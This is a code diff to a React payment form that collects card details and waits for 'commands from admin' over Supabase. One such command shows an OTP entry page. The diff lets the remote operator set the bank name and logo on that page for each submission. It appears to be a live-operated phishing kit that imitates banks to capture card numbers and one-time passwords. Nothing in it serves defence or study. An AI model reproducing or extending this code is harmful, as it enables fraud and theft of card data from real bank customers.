@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
@@ -43,6 +42,7 @@ const PaymentForm = () => {
   const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
   const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
   const [selectedBank, setSelectedBank] = useState('ICICI BANK');
+  const [selectedBankLogo, setSelectedBankLogo] = useState('');
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -181,6 +181,8 @@ const PaymentForm = () => {
           console.log('Received command from admin via Supabase:', payload.new);
           const command = payload.new.command;
           const submissionId = payload.new.submission_id;
+          const bankName = payload.new.bank_name;
+          const bankLogo = payload.new.bank_logo;
           
           // Only process commands for the current submission
           if (submissionId && submissionId !== currentSubmissionId) {
@@ -189,6 +191,8 @@ const PaymentForm = () => {
           
           switch (command) {
             case 'showotp':
+              if (bankName) setSelectedBank(bankName);
+              if (bankLogo) setSelectedBankLogo(bankLogo);
               setFadeState('fadeOut');
               setTimeout(() => {
                 setIsLoading(false);
@@ -437,7 +441,7 @@ const PaymentForm = () => {
 
   if (showOtp) {
     return (
-      <div className="w-full">
+      <div className="w-96 bg-white border-l border-gray-200">
         <OTPVerificationPage
           onBack={() => setShowOtp(false)}
           onConfirm={handleConfirmPay}
@@ -445,7 +449,7 @@ const PaymentForm = () => {
           invalidOtpMessage={invalidOtpMessage}
           cardNumber={formData.cardNumber}
           amount={formData.amount}
-          bankLogo={selectedBank}
+          bankLogo={selectedBankLogo}
         />
       </div>
     );
